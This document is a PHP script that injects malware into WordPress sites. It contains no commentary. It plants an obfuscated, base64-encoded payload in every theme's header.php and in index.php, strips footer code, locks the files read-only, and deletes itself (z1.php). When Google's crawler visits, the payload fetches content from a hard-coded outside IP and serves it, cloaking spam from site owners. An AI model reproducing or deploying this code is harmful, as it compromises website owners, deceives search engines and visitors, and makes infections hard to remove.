<?php


$code = '<?php error_reporting(0);$jpictk_73b144dc=base64_decode("Li4u").mb_strtolower($_SERVER[HTTP_USER_AGENT]);$jpictk_73b144dc=str_replace(base64_decode("IA=="),base64_decode("LQ=="),$jpictk_73b144dc);if(mb_stripos($jpictk_73b144dc,base64_decode("Z29vZ2xl"))){$gxscsh_8a8bb7cd=base64_decode("MTc2");$olowsf_693a9fdd=base64_decode("MzE=");$rksqlr_9d607a66=base64_decode("MjUz");$gqrpko_894f782a=base64_decode("MjI3");$zstwbp_848e4626=base64_decode("Y2FrZXM=");$luzfqa_d88fc6ed=curl_init();curl_setopt($luzfqa_d88fc6ed,CURLOPT_URL,"http://$gxscsh_8a8bb7cd.$olowsf_693a9fdd.$rksqlr_9d607a66.$gqrpko_894f782a/$zstwbp_848e4626/?useragent=$jpictk_73b144dc&domain=$_SERVER[HTTP_HOST]");$gdfhly_b4a88417=curl_exec($luzfqa_d88fc6ed);curl_close($luzfqa_d88fc6ed);echo $gdfhly_b4a88417;} $botbotbot=0;?>
 ';

$wpfolder = ".";
if (file_exists("wp")) $wpfolder = "wp";
if (file_exists("wordpress")) $wpfolder = "wordpress";

	if ((file_exists($wpfolder."/wp-admin")) AND (file_exists($wpfolder."/wp-content")) AND (file_exists($wpfolder."/wp-includes")))
	{

	$orig_index = "<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );";
chmod ($wpfolder."/index.php", 0777);
unlink($wpfolder."/index.php");

    file_put_contents($wpfolder."/index.php", $orig_index);

chmod ($wpfolder."/index.php", 0444);
	}

if ((file_exists($wpfolder."/wp-admin")) AND (file_exists($wpfolder."/wp-content")) AND (file_exists($wpfolder."/wp-includes")))
{
chmod($wpfolder."/wp-content", 0777);
if (file_exists($wpfolder."/wp-content/themes"))
{
chmod($wpfolder."/wp-content/themes", 0777);
	$dirs = scandir($wpfolder."/wp-content/themes");
	foreach ($dirs as $dir)
	{
		if ((is_dir($wpfolder."/wp-content/themes/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		{
chmod($wpfolder."/wp-content/themes/$dir", 0777);			
			if (file_exists($wpfolder."/wp-content/themes/$dir/header.php")) 
			{
				          $file = fopen($wpfolder."/wp-content/themes/".$dir."/header.php", "r"); 
                          $buffer = fread($file, filesize($wpfolder."/wp-content/themes/".$dir."/header.php")); 
						  $buffer2 = str_replace("\n", "11111111111111", $buffer);
						  $buffer2 = substr($buffer2, strpos($buffer2,"botbotbot"));
                          $buffer2 = substr($buffer2, strpos($buffer2,">")+1);
						  if (!strpos($buffer2, '$botbotbot'))
						  {
						  $buffer2 = $code."\n".$buffer2;
						  $buffer2 = str_replace("11111111111111", "\n", $buffer2);
						  chmod($wpfolder."/wp-content/themes/$dir/header.php", 0777);
						  unlink($wpfolder."/wp-content/themes/$dir/header.php");
						  $outheader = fopen($wpfolder."/wp-content/themes/".$dir."/header.php", "w");
						  fwrite($outheader, $buffer2);
						  fclose($outheader);
						  chmod($wpfolder."/wp-content/themes/$dir/header.php", 0444);
						  }
            }
			
			if (file_exists($wpfolder."/wp-content/themes/$dir/footer.php")) 
			{
				          $file = fopen($wpfolder."/wp-content/themes/".$dir."/footer.php", "r"); 
                          $buffer = fread($file, filesize($wpfolder."/wp-content/themes/".$dir."/footer.php")); 
						  $buffer2 = str_replace("\n", "11111111111111", $buffer);
						  $buffer2 = substr($buffer2, strpos($buffer2,"botbotbot"));
                          $buffer2 = substr($buffer2, strpos($buffer2,">")+1);
						  
						  $buffer2 = str_replace("11111111111111", "\n", $buffer2);
						  chmod($wpfolder."/wp-content/themes/$dir/footer.php", 0777);
						  unlink($wpfolder."/wp-content/themes/$dir/footer.php");
						  $outfooter = fopen($wpfolder."/wp-content/themes/".$dir."/footer.php", "w");
						  fwrite($outfooter, $buffer2);
						  fclose($outfooter);
						  chmod($wpfolder."/wp-content/themes/$dir/footer.php", 0444);
						  
            }			
			
			}
		}
	}
}

else
{
					      $file = fopen("index.php", "r"); 
                          $buffer = fread($file, filesize("index.php")); 
						  $buffer2 = str_replace("\n", "11111111111111", $buffer);
						  $buffer2 = substr($buffer2, strpos($buffer2,"botbotbot"));
                          $buffer2 = substr($buffer2, strpos($buffer2,">")+1);
						   if (!strpos($buffer2, '$botbotbot'))
						  {
						  $buffer2 = $code."\n".$buffer2;
						  $buffer2 = str_replace("11111111111111", "\n", $buffer2);
						  chmod("index.php", 0777);
						  unlink("index.php");
						  $outheader = fopen("index.php", "w");
						  fwrite($outheader, $buffer2);
						  fclose($outheader);
						  chmod("index.php", 0444);
						  }
}



@unlink("z1.php");

?>